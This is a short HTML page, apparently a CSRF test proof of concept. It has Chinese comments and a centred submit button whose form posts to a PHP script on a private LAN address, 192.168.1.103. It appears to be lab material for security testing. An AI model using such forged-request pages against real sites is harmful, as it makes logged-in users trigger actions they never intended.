<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>CSRF 测试</title>
    <style>
        /* 清除默认边距，并让 body 占满全屏高度 */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            /* 使用 Flexbox 布局实现居中 */
            justify-content: center; /* 水平居中 */
            align-items: center;    /* 垂直居中 */
            background-color: #f0f0f0; /* 添加一个浅色背景，方便看清按钮位置 */
        }

        /* 修饰一下按钮，让它在手机上看起来更好点（可选） */
        input[type="submit"] {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <form action="http://192.168.1.103/t1/1.php" method="post">
        <input type="submit" value="提交查询">
    </form>
</body>
</html>
